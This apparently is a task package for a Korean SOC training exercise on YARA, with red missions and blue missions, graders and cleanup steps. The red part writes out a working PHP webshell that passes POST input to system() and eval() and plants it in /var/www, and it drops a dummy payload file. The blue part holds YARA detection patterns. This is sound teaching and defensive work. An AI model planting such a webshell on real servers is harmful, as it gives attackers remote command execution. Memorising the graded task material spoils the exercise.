@@ -1,0 +1,340 @@
+id: "soc-adv-w04"
+category: "soc-adv"
+title: "[SOC고급 W4] YARA 악성코드 탐지 — 웹쉘·페이로드 투입 vs 시그니처 헌팅"
+difficulty: "hard"
+time_limit: 3000
+battle_type: "1v1"
+description: |
+  SOC 고급과정 4주차 — **YARA**. YARA 는 파일/메모리에서 악성코드를 **문자열·바이트 패턴**으로 잡는
+  시그니처 언어다. 이번 공방전에서 공격자는 대상 웹서버에 **웹쉘**과 **악성 페이로드 파일**을 떨구고,
+  관제팀(너)은 **YARA 룰을 작성해 `/var/www` 를 스캔**하고 Wazuh 와 연동해 자동 탐지를 만든다.
+
+  ▸ 이야기
+    공격자가 업로드 취약점을 통해 PHP 웹쉘 `/var/www/html/.sa04shell.php` 와 패킹된 악성 페이로드
+    `/tmp/.sa04mal` 을 심는다. 관제팀은 ① 웹쉘 YARA 룰을 작성하고, ② Wazuh+YARA 자동 탐지를 연동하고,
+    ③ 실제로 `/var/www` 를 스캔해 웹쉘을 찾아 제거하고, ④ IOC→YARA 파이프라인과 엔트로피 기반 패커 탐지를
+    설계하고, ⑤ 종합 보고·룰 품질 평가로 마무리한다.
+
+  ▸ 모드
+    • solo : 공격(자기 인프라 표적) + 관제를 한 학생이. 대상 = 본인 인프라.
+    • duel : Red 가 상대(Blue) 인프라를 외부 공격, Blue 는 자기 인프라에서 YARA 탐지.
+
+  ▸ 공격자 위치(중요)
+    Red 미션은 **attacker-ext(SSH 2203)** 외부 침입자 기준. 외부 명령은 6v6 가 수집 못 하므로 Red 채점은
+    **대상 호스트에 남은 파일(웹쉘·페이로드)** 로 한다.
+
+  ▸ 이번 주차 전용 마커
+    웹쉘 **`/var/www/html/.sa04shell.php`**(내부 마커 문자열 `sa04webshell`), 악성 페이로드 **`/tmp/.sa04mal`**,
+    YARA 룰 파일 **`/var/ossec/etc/yara/soc-adv-w04.yar`**(룰명 `SOCADV_W04_*`), Wazuh 연동룰 **id 102041**. 종료 시 cleanup.
+
+red_missions:
+  - order: 1
+    assess_target: opponent
+    target_vm: web
+    points: 18
+    instruction: |
+      ## 🎯 RED-1 [웹쉘 투입] — PHP 웹쉘로 원격 실행 발판 심기
+
+      ### 상황
+      웹쉘은 가장 흔한 침투 후 발판이다. 너는 대상 웹서버에 PHP 웹쉘 **`/var/www/html/.sa04shell.php`** 를
+      떨군다. 귀속을 위해 파일 안에 마커 문자열 **`sa04webshell`** 을 넣는다. 관제팀의 YARA 룰이 이걸 잡아야 한다.
+
+      ### 할 일 (업로드 취약점 또는 발판 후)
+      ```bash
+      cat > /var/www/html/.sa04shell.php <<'PHP'
+      <?php /* sa04webshell */ if(isset($_POST['c'])){ system($_POST['c']); } eval($_POST['x'] ?? ''); ?>
+      PHP
+      ```
+
+      ### 채점 방법
+      대상 웹서버에 웹쉘 파일 `/var/www/html/.sa04shell.php` 가 있는지(+ 내부 마커 `sa04webshell`)로 채점.
+
+      ### 합격 기준
+      `/var/www/html/.sa04shell.php` 가 존재하고 마커 `sa04webshell` 을 포함한다.
+    hint: "PHP 웹쉘 /var/www/html/.sa04shell.php (eval/system + 마커 sa04webshell). 채점: file_exists + file_contains 마커."
+    verify:
+      type: "file_exists"
+      expect: "/var/www/html/.sa04shell.php"
+      checks:
+        - { id: "red-1-1", type: "file_exists", target: "web", params: { path: "/var/www/html/.sa04shell.php" } }
+        - { id: "red-1-2", type: "file_contains", target: "web",
+            params: { path: "/var/www/html/.sa04shell.php", pattern: "sa04webshell" } }
+      semantic:
+        intent: "웹쉘 투입(T1505.003 Web Shell) — PHP eval/system 웹쉘 + 귀속 마커(sa04webshell). YARA 웹쉘 룰의 표적."
+        success_criteria:
+          - "/var/www/html/.sa04shell.php 존재 + 마커 sa04webshell"
+          - "웹쉘 동작(eval/system)과 투입 경로 서술"
+        acceptable_methods:
+          - "업로드 취약점 또는 발판 후 파일 작성"
+        negative_signs:
+          - "파일 부재 / 마커 누락"
+
+  - order: 2
+    assess_target: opponent
+    target_vm: web
+    points: 17
+    instruction: |
+      ## 🎯 RED-2 [악성 페이로드 드롭] — 패킹된 악성 파일 심기
+
+      ### 상황
+      웹쉘 외에 **악성 바이너리/페이로드 파일**도 떨군다. 너는 알려진 악성 시그니처(마커 `sa04mal`)를 가진
+      페이로드 **`/tmp/.sa04mal`** 을 심는다. 관제팀의 YARA 시그니처/엔트로피 룰이 이걸 잡아야 한다.
+
+      ### 할 일
+      ```bash
+      printf 'sa04mal MALICIOUS-DROPPER eval base64_decode CryptEncrypt' > /tmp/.sa04mal
+      chmod +x /tmp/.sa04mal
+      ```
+
+      ### 채점 방법
+      대상 호스트에 `/tmp/.sa04mal` 이 있고 마커 `sa04mal` 을 포함하는지로 채점.
+
+      ### 합격 기준
+      `/tmp/.sa04mal` 이 존재하고 마커 `sa04mal` 을 포함한다.
+    hint: "악성 페이로드 /tmp/.sa04mal (마커 sa04mal + 악성 문자열). 채점: file_exists + file_contains sa04mal."
+    verify:
+      type: "file_exists"
+      expect: "/tmp/.sa04mal"
+      checks:
+        - { id: "red-2-1", type: "file_exists", target: "web", params: { path: "/tmp/.sa04mal" } }
+        - { id: "red-2-2", type: "file_contains", target: "web",
+            params: { path: "/tmp/.sa04mal", pattern: "sa04mal" } }
+      semantic:
+        intent: "악성 페이로드 드롭(T1105 Ingress Tool Transfer) — 알려진 악성 시그니처 파일. YARA 문자열/엔트로피 탐지의 표적."
+        success_criteria:
+          - "/tmp/.sa04mal 존재 + 마커 sa04mal"
+          - "페이로드 시그니처와 드롭 경로 서술"
+        acceptable_methods:
+          - "파일 드롭 + 악성 시그니처 문자열 포함"
+        negative_signs:
+          - "파일 부재 / 마커 누락"
+
+blue_missions:
+  - order: 1
+    assess_target: self
+    target_vm: web
+    points: 16
+    instruction: |
+      ## 🛡️ BLUE-1 [웹쉘 YARA 룰] — eval/system/base64 패턴 시그니처 (SOCADV_W04)
+
+      ### 상황
+      RED-1 의 웹쉘을 잡는 YARA 룰을 작성한다. 웹쉘 공통 패턴(`eval($_POST`, `system(`, `base64_decode`)과
+      이번 주 마커를 strings 로 잡는다.
+
+      ### 할 일
+      `/var/ossec/etc/yara/soc-adv-w04.yar` 에 작성한다(디렉토리 없으면 생성).
+      ```bash
+      sudo mkdir -p /var/ossec/etc/yara
+      sudo tee /var/ossec/etc/yara/soc-adv-w04.yar >/dev/null <<'YAR'
+      rule SOCADV_W04_php_webshell {
+        meta:
+          description = "SOCADV-W04 PHP webshell detection"
+          author = "soc-adv"
+        strings:
+          $eval = "eval($_POST" nocase
+          $sys  = "system(" nocase
+          $b64  = "base64_decode(" nocase
+          $tag  = "sa04webshell"
+        condition:
+          $tag or 2 of ($eval, $sys, $b64)
+      }
+      YAR
+      yara /var/ossec/etc/yara/soc-adv-w04.yar /var/www/html/.sa04shell.php   # 룰 검증
+      ```
+
+      ### 채점 방법
+      `/var/ossec/etc/yara/soc-adv-w04.yar` 에 룰명 `SOCADV_W04` 가 있는지로 확인.
+
+      ### 합격 기준
+      YARA 룰 파일에 `SOCADV_W04_*` 웹쉘 룰이 존재한다.
+    hint: "웹쉘 YARA 룰(meta/strings/condition, 룰명 SOCADV_W04) → /var/ossec/etc/yara/soc-adv-w04.yar. 채점: file_contains 그 파일 SOCADV_W04."
+    verify:
+      type: "file_contains"
+      expect: "SOCADV_W04"
+      checks:
+        - { id: "blue-1-1", type: "file_contains", target: "web",
+            params: { path: "/var/ossec/etc/yara/soc-adv-w04.yar", pattern: "SOCADV_W04" } }
+      semantic:
+        intent: "웹쉘 YARA 룰 — meta/strings/condition 으로 eval/system/base64 + 마커 탐지. 파일 기반 악성코드 시그니처."
+        success_criteria:
+          - "soc-adv-w04.yar 에 SOCADV_W04 룰(meta/strings/condition)"
+          - "웹쉘 공통 패턴 + condition 논리(예: 2 of)"
+          - "yara 로 룰 검증 수행 서술"
+        acceptable_methods:
+          - "YARA 룰 작성 + yara 실행 검증"
+        negative_signs:
+          - "strings/condition 부실 / 문법 오류"
+
+  - order: 2
+    assess_target: self
+    target_vm: siem
+    points: 15
+    instruction: |
+      ## 🛡️ BLUE-2 [Wazuh+YARA 연동] — 매칭 자동 고위험 격상 (id 102041)
+
+      ### 상황
+      YARA 매칭을 분석가가 일일이 돌릴 수는 없다. Wazuh 와 연동해 **파일 변경(FIM) 시 YARA 스캔 → 매칭 시
+      자동 고위험 경보**가 되게 한다. 매칭 결과를 격상하는 Wazuh 룰(**id 102041**, level 13)을 만든다.
+
+      ### 할 일
+      `/var/ossec/etc/rules/local_rules.xml` 에 추가 후 재시작:
+      ```xml
+      <group name="edu,malware,">
+        <rule id="102041" level="13">
+          <if_group>edu</if_group>
+          <match>YARA</match>
+          <description>SOCADV-W04 - YARA malware match detected, escalate</description>
+        </rule>
+      </group>
+      ```
+      (개념: syscheck FIM 이벤트 → active-response 로 YARA 스캔 → 매칭 로그가 위 룰로 격상.)
+      ```bash
+      sudo /var/ossec/bin/wazuh-control restart
+      ```
+
+      ### 채점 방법
+      `local_rules.xml` 에 id 102041 룰이 있는지로 확인.
+
+      ### 합격 기준
+      `local_rules.xml` 에 YARA 매칭을 격상하는 id 102041 룰이 존재한다.
+    hint: "Wazuh+YARA 연동 격상룰(id 102041, level 13) → restart. FIM→YARA 스캔 파이프라인 개념. 채점: file_contains local_rules.xml 102041."
+    verify:
+      type: "file_contains"
+      expect: "102041"
+      checks:
+        - { id: "blue-2-1", type: "file_contains", target: "siem",
+            params: { path: "/var/ossec/etc/rules/local_rules.xml", pattern: "102041" } }
+      semantic:
+        intent: "Wazuh+YARA 자동화 — FIM 이벤트 시 YARA 스캔 + 매칭 자동 고위험 격상(level 13). 탐지→대응 자동 연계."
+        success_criteria:
+          - "local_rules.xml 에 rule id 102041 (level≥10)"
+          - "FIM→YARA 스캔→격상 파이프라인 설명"
+          - "active-response/wodle 연동 개념"
+        acceptable_methods:
+          - "Wazuh 룰 + 연동 개념 서술 + restart"
+        negative_signs:
+          - "연동 개념 누락 / XML 오류"
+
+  - order: 3
+    assess_target: self
+    target_vm: web
+    points: 15
+    instruction: |
+      ## 🛡️ BLUE-3 [웹쉘 헌팅·제거] — /var/www YARA 스캔으로 식별 후 제거
+
+      ### 상황
+      이론이 아니라 실제 탐지다. BLUE-1 의 YARA 룰로 `/var/www` 를 스캔해 RED-1 의 웹쉘
+      `/var/www/html/.sa04shell.php` 를 찾아 격리·제거한다.
+
+      ### 할 일
+      ```bash
+      sudo yara -r /var/ossec/etc/yara/soc-adv-w04.yar /var/www 2>/dev/null   # 재귀 스캔
+      find /var/www -name '.*.php' -mmin -120 2>/dev/null                      # 최근 숨김 PHP
+      ```
+      식별 후 보고서에 "발견 → 격리 → 제거 → 복구" 단계로 적는다(실제 제거는 파일 삭제).
+
+      ### 채점 방법
+      대상 웹서버에서 웹쉘 `/var/www/html/.sa04shell.php` 가 헌팅되는지로 채점(발견이 핵심).
+
+      ### 합격 기준
+      `/var/www/html/.sa04shell.php` 를 스캔으로 식별한다(식별 후 제거 보고).
+    hint: "yara -r 룰 /var/www 재귀 스캔 → 웹쉘 식별 → IR 제거. 채점: file_exists /var/www/html/.sa04shell.php(발견 핵심)."
+    verify:
+      type: "file_exists"
+      expect: "/var/www/html/.sa04shell.php"
+      checks:
+        - { id: "blue-3-1", type: "file_exists", target: "web", params: { path: "/var/www/html/.sa04shell.php" } }
+      semantic:
+        intent: "실제 웹쉘 헌팅 — YARA 재귀 스캔으로 /var/www 의 웹쉘 발견 + IR 제거. 룰을 production 에 적용하는 검증."
+        success_criteria:
+          - "웹쉘 파일 식별(스캔 매칭)"
+          - "어떤 룰/스캔으로 어디서 찾았는지 제시"
+          - "발견→격리→제거→복구 단계 적용"
+        acceptable_methods:
+          - "yara -r 스캔 또는 find 로 발견 + 제거"
+        negative_signs:
+          - "스캔 없이 추정 / 제거 누락"
+
+  - order: 4
+    assess_target: self
+    target_vm: siem
+    points: 18
+    instruction: |
+      ## 🛡️ BLUE-4 [IOC→YARA 파이프라인] — 엔트로피·패커 탐지 + 자동 갱신 설계
+
+      ### 상황
+      성숙한 악성코드 탐지는 **위협 인텔의 IOC 를 YARA 로 자동 변환**하고, 패킹된 미지 악성코드는 **엔트로피**로
+      잡는다. IOC(해시/문자열)→YARA 파이프라인과 엔트로피 기반 패커 탐지 룰을 설계한다.
+
+      ### 할 일
+      보고서에:
+      - IOC→YARA: TI 피드의 해시/문자열을 YARA strings 로 변환하는 절차 + 자동 갱신(cron) 방안
+      - 엔트로피 룰(개념): `import math` + `math.entropy(0, filesize) > 7.5` 로 패킹/암호화 섹션 탐지
+      - RED-2 의 `/tmp/.sa04mal` 같은 미지 페이로드를 어떻게 잡을지
+      ```bash
+      sudo tail -200 /var/ossec/logs/alerts/alerts.json | \
+        python3 -c 'import sys,json;[print(json.loads(l).get("rule",{}).get("id")) for l in sys.stdin if l.strip()]' | sort | uniq -c | sort -rn | head
+      ```
+
+      ### 채점 방법
+      본인 SIEM 에 최근 경보가 수집돼 있는지 + 제출한 IOC→YARA 파이프라인/엔트로피 설계로 채점.
+
+      ### 합격 기준
+      본인 SIEM 에 최근 경보가 있다(+ IOC→YARA 파이프라인·엔트로피 패커 탐지 설계는 제출로 검증).
+    hint: "IOC(해시/문자열)→YARA 변환 파이프라인 + cron 자동갱신 + math.entropy>7.5 패커 탐지 설계. 채점: wazuh_alert + 제출."
+    verify:
+      type: "wazuh_alert"
+      expect: "alert"
+      checks:
+        - { id: "blue-4-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
+      semantic:
+        intent: "IOC→YARA 자동화 + 엔트로피 패커 탐지 설계. 분석/설계형 — 미지 악성코드 대응 전략. 실재 증거 인용 시 점수 상승."
+        success_criteria:
+          - "최근 경보 수집 확인"
+          - "IOC→YARA 변환 파이프라인 + 자동 갱신 방안"
+          - "엔트로피(math.entropy>7.5) 기반 패커/미지 악성코드 탐지 설계"
+        acceptable_methods:
+          - "파이프라인 설계 + 엔트로피 룰 개념"
+        negative_signs:
+          - "IOC 변환/엔트로피 누락"
+
+  - order: 5
+    assess_target: self
+    target_vm: siem
+    points: 19
+    instruction: |
+      ## 🛡️ BLUE-5 [종합 보고·Cleanup] — 탐지 범위 + 룰 품질 평가 + 위생
+
+      ### 상황
+      YARA 탐지 체계의 산출물이다. 룰셋 목록, **탐지 범위**(웹쉘/패커/랜섬웨어 등 유형별), Wazuh 연동 상태,
+      **룰 품질 평가**(커버리지/오탐률/성능), 운영 절차를 종합하고, R/B/P 회고 후 아티팩트를 **일괄 cleanup** 한다.
+
+      ### 할 일
+      - 탐지 범위 표 + 룰 품질 평가(커버리지·FP율·스캔 성능)
+      - R/B/P 회고 + cleanup:
+      ```bash
+      sudo rm -f /var/www/html/.sa04shell.php /tmp/.sa04mal /var/ossec/etc/yara/soc-adv-w04.yar
+      # local_rules.xml 에서 102041 블록 제거 후 wazuh-control restart
+      ```
+
+      ### 채점 방법
+      본인 SIEM 에 최근 경보가 수집돼 있는지 + 제출한 탐지 범위/품질 평가/회고/cleanup 으로 채점.
+
+      ### 합격 기준
+      본인 SIEM 에 최근 경보가 있다(+ 탐지 범위·룰 품질 평가·회고·cleanup 은 제출로 검증).
+    hint: "탐지 범위(웹쉘/패커/랜섬) + 룰 품질 평가(커버리지/FP/성능) + 운영 절차 + R/B/P 회고 + 웹쉘/페이로드/YARA파일/102041 일괄 cleanup. 채점: wazuh_alert + 제출."
+    verify:
+      type: "wazuh_alert"
+      expect: "alert"
+      checks:
+        - { id: "blue-5-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
+      semantic:
+        intent: "YARA 종합 — 룰셋 목록 + 탐지 범위 + Wazuh 연동 상태 + 룰 품질 평가 + 운영 절차 + R/B/P 회고 + cleanup. Malware detection 보고서."
+        success_criteria:
+          - "최근 경보 수집 확인"
+          - "탐지 범위(유형별) + 룰 품질 평가(커버리지/FP/성능)"
+          - "R/B/P 회고 + 아티팩트(웹쉘/페이로드/YARA파일/102041) 일괄 cleanup"
+        acceptable_methods:
+          - "범위 표 + 품질 평가 + 회고 + cleanup"
+        negative_signs:
+          - "품질 평가 없이 서술만 / cleanup 미완"
